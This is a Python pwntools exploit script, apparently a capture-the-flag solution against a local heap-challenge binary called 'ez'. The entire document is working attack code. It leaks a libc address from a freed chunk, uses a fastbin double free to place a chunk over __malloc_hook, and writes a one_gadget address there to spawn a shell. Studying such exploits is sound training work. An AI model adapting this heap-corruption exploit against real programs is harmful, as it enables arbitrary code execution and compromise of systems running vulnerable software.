from pwn import *
import time
context.log_level='debug'
p=process('./ez')
e=ELF('./ez')
libc=p.libc
def add(size,name,kind):
    p.sendlineafter("Your choice : ",'1')
    p.sendlineafter("Length of the name :",str(size))
    p.sendlineafter("The name of animal :",name)
    p.sendlineafter("The kind of the animal :",kind)

def check():
    p.sendlineafter("Your choice : ",'2')

def delete(idx):
    p.sendlineafter("Your choice : ",'3')
    p.sendlineafter("Which animal do you want to remove from the cage:",str(idx))

def clean():
    p.sendlineafter("Your choice : ",'4')

print('--------------------------')
print('leak libc')
add(0x90,'aaaa','aaaa')
add(0x90,'bbbb','bbbb')
delete(0)
clean()
add(0x90,'\xff'*8,'cccc')
check()
print 'hook->'+hex(libc.symbols['__malloc_hook'])
p.recvuntil('\xff'*8)
leak=u64(p.recv(6).ljust(8,'\x00')) #main_arena addr
offset=leak-0x3C4B20-0x58   #main_arena offset
one=offset+0x4526a
malloc_hook=offset+libc.symbols['__malloc_hook']

print 'malloc->'+hex(malloc_hook)
print('offset'+hex(offset))
print('-----------------')
print('then fastbin dup')
fd=malloc_hook-0x23
add(0x58,"a"*0x30,"a"*0x10)
add(0x58,"a"*0x30,"a"*0x10)
add(0x58,"a"*0x30,"a"*0x10)
add(0x58,"a"*0x30,"a"*0x10)

delete(2)
delete(3)
delete(2)
add(0x58,p64(fd),"a"*0x10)
sleep(0.2)
add(0x58,"a"*0x30,"a"*0x10)
sleep(0.2)
add(0x58,"a"*0x30,"a"*0x10)
sleep(0.2)
add(0x58,"a"*0x13+p64(one),"a"*0x10)
sleep(0.2)
delete(0)
sleep(0.2)
delete(0)

p.interactive()